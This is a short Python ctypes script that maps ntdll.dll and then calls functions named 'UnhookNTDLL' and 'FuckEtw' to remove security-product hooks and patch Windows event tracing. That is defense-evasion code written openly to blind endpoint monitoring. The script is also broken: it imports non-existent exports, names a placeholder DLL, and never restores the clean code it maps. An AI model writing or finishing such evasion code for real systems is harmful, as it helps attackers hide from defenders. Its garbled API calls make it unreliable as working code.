import ctypes

# Step 1: Display banner and initialize variables
print("Welcome to my app!")
ntdll_file = "ntdll.dll"

# Step 2: Open the ntdll.dll file
ntdll_handle = ctypes.windll.kernel32.CreateFileA(
    ntdll_file,
    ctypes.c_uint32(0x80000000),  # GENERIC_READ
    ctypes.c_uint32(0x00000001),  # FILE_SHARE_READ
    None,
    ctypes.c_uint32(3),  # OPEN_EXISTING
    ctypes.c_uint32(0),
    None
)

if ntdll_handle == -1:
    print("Failed to open ntdll.dll file")
    exit()

# Step 3: Create a file mapping
file_mapping = ctypes.windll.kernel32.CreateFileMappingA(
    ntdll_handle,
    None,
    ctypes.c_uint32(0x02),  # PAGE_READONLY
    ctypes.c_uint32(0),
    ctypes.c_uint32(0),
    None
)

if file_mapping == 0:
    print("Failed to create file mapping")
    ctypes.windll.kernel32.CloseHandle(ntdll_handle)
    exit()

# Step 4: Map the file into memory
mapped_file = ctypes.windll.kernel32.MapViewOfFile(
    file_mapping,
    ctypes.c_uint32(0x04),  # FILE_MAP_READ
    ctypes.c_uint32(0),
    ctypes.c_uint32(0),
    ctypes.c_uint32(0)
)

if not mapped_file:
    print("Failed to map the file into memory")
    ctypes.windll.kernel32.CloseHandle(file_mapping)
    ctypes.windll.kernel32.CloseHandle(ntdll_handle)
    exit()

# Step 5: Call UnhookNTDLL function
# Define the UnhookNTDLL function prototype
UnhookNTDLL = ctypes.WINFUNCTYPE(None, ctypes.c_void_p)(("UnhookNTDLL", ctypes.windll.ntdll))

# Call the UnhookNTDLL function
UnhookNTDLL()

# Step 6: Display the address of the unhooked Ntdll base
print("Address of the unhooked Ntdll base:", mapped_file)

# Step 7: Clean up the mapped file and handles
ctypes.windll.kernel32.UnmapViewOfFile(mapped_file)
ctypes.windll.kernel32.CloseHandle(file_mapping)
ctypes.windll.kernel32.CloseHandle(ntdll_handle)

# Step 8: Display the current process ID and wait for user input 
process_id = ctypes.windll.kernel32.GetCurrentProcessId()
print("Current Process ID:", process_id)
input("Press Enter to continue...")

# Step 9: Call the FuckEtw function to patch the ETW
# Define the FuckEtw function prototype
FuckEtw = ctypes.WINFUNCTYPE(None)(("FuckEtw", ctypes.windll.your_dll))

# Call the FuckEtw function
FuckEtw()

# Step 10: Display a message indicating that the ETW has been patched
print("ETW has been patched!")
